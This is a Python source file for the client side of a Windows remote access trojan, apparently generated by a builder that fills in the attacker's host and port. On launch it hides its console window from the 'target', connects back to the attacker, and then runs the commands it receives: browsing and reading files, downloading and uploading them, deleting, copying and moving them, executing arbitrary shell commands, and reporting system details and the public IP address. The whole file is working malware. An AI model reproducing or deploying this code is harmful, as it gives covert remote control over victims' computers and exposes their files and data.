#!/usr/bin python3

import socket
import os
import platform, socket, re, uuid, json, psutil, logging  # finding system info
from requests import get
import shutil
import subprocess
import win32gui, win32con

play_video = "VideoFalse"
if play_video == "VideoTrue":
    subprocess.run(("cmd", "/c", "start", "", "Vid.mp4"))
else:
    pass

def main():
    try:

        hide = win32gui.GetForegroundWindow()  # Hide console as soon as target opens the payload
        win32gui.ShowWindow(hide, win32con.SW_HIDE)  # Hide console as soon as target opens the payload

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = "LHOST"  # These values will be overewritten and replaced by the Lhost entered in the server
        port = "LPORT" # These values will be overewritten and replaced by the Lport entered in the server
        s.connect((host, int(port)))  # binding the port with host
        connect = True

        while connect:
            msg = s.recv(10000000000).decode('ansi')  # receive from host

            try:
                def message():
                    if msg == "pwd":
                        pwd = os.getcwd()
                        s.send(bytes(str(pwd).encode("ansi")))

                message()

                def select_dir():  # function for selecting file
                    if msg.startswith("cd "):
                        split = msg.split(" ")  # splitting the word
                        fPath = split[1]
                        os.chdir(str(fPath))  # changing directory according to input
                        pwd = os.getcwd()

                        s.send(bytes(str(pwd).encode("ansi")))

                select_dir()

                def list_dir():  # function for listing files
                    if msg == "ls":
                        pwd = os.getcwd()
                        ls = os.listdir(pwd)

                        s.send(bytes(str(ls).encode("ansi")))

                list_dir()

                def undo_dir():  # function for undoing
                    if msg == "cd..":
                        pwd = os.getcwd()
                        splits = str(pwd)
                        splitter = splits.split("\\")
                        lenth = len(splitter)
                        last_word_in_split = str(splitter[-1])
                        lenth_calc = (lenth - 1)
                        lenth_bind = int(lenth_calc)
                        undo = str(splitter[:lenth_bind])

                        splits = str(pwd)
                        splitter = splits.split(f"\\{last_word_in_split}")
                        undo = str(splitter[0])

                        cd = os.chdir(undo)
                        pwd = os.getcwd()
                        s.send(bytes(str(pwd).encode("ansi")))

                undo_dir()

                def read_file():  # function for listing files
                    if msg.startswith("cat"):
                        split = msg.split(" ")
                        file_path = str(split[1])
                        text = open(file_path, "rb")
                        text_read = text.read().decode('ansi')

                        s.send(bytes(str(text_read).encode("ansi")))

                read_file()

                # HANDLING EXTERNAL COMMANDS

                def download():
                    if msg.startswith("download"):
                        split = msg.split(" ")
                        Rfile = split[1]
                        text = open(Rfile, "rb")
                        byte = text.read().decode("ansi")
                        s.send(bytes(byte.encode("ansi")))

                download()

                def upload():
                    if msg.startswith("upload"):  # upload

                        splitter = msg.split(" ")
                        file = splitter[-1]  # File to upload
                        file_name = splitter[-2]  # File to upload dir

                        splitter = file_name.split("\\")  # split
                        Rfile = splitter[-1]  # File to upload name
                        text = open(file + "\\" + Rfile, "wb")
                        msg2 = s.recv(100000000).decode("ansi")
                        text.write(bytes(msg2.encode("ansi")))
                        text.close()
                        s.send(bytes("File successfully uploaded ".encode("ansi")))

                upload()

                def remove():
                    if msg.startswith("rm"):
                        split = msg.split(" ")
                        Rfile = split[1]
                        os.remove(Rfile)
                        MSG = "file successfully deleted"
                        s.send(bytes(MSG.encode("ansi")))

                remove()

                def ip_finder():  # find IP
                    if msg == "get_ip":
                        ip = get('https://api.ipify.org').text
                        MSG = 'Public IP address is: {}'.format(ip)
                        s.send(bytes(str(MSG).encode("ansi")))

                ip_finder()

                def cmd():  # find wifi
                    if msg.startswith("cmd"):
                        if msg.startswith("cmd -f"):
                            cmd_command = msg[7:]
                            ipconf = subprocess.run(f"{cmd_command}", capture_output=True, text=True)
                            MSG = ipconf.stdout
                            s.send(bytes(str(MSG).encode("ansi")))
                        else:
                            cmd_command = msg[4:]
                            ipconf = subprocess.run(f"{cmd_command}", shell=True, capture_output=True, text=True)
                            MSG = ipconf.stdout
                            s.send(bytes(str(MSG).encode("ansi")))

                cmd()

                def copy():
                    if msg.startswith("copy"):  # upload

                        splitter = msg.split(" ")
                        path = splitter[1]  # File to upload
                        destination = splitter[2]  # File to upload dir

                        shutil.copy(path, destination)
                        s.send(bytes("File copied Successfully".encode("ansi")))

                copy()

                def move():
                    if msg.startswith("move"):  # upload

                        splitter = msg.split(" ")
                        path = splitter[1]  # File to upload
                        destination = splitter[2]  # File to upload dir

                        shutil.move(path, destination)
                        s.send(bytes("File moved Successfully".encode("ansi")))

                move()

                def getSystemInfo():  # Find location
                    if msg == "sysinfo":
                        try:
                            info = f"""platform: {platform.system()}
            architecture: {platform.machine()}
            hostname: {socket.gethostname()}
            ip-address: {socket.gethostbyname(socket.gethostname())}
            mac-address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
            processor: {platform.processor()}
            ram: {str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"}
            """
                            s.send(bytes(info.encode("ansi")))
                        except Exception as e:
                            err = str(logging.exception(e))
                            s.send(bytes(err.encode("ansi")))

                getSystemInfo()


            except FileNotFoundError:
                s.send(bytes("FIle not found".encode("ansi")))
            except UnicodeEncodeError:
                error = "'mbcs' codec can't encode characters in position 0--1: invalid character"
                s.send(bytes(str(error).encode("ascii")))
            except OSError:
                s.send(bytes("File directory not found".encode("ansi")))
            except Exception as e:
                msg = str(e)
                x = True
                s.send(bytes(msg.encode("ansi")))
    except Exception as e:
        pass


main()

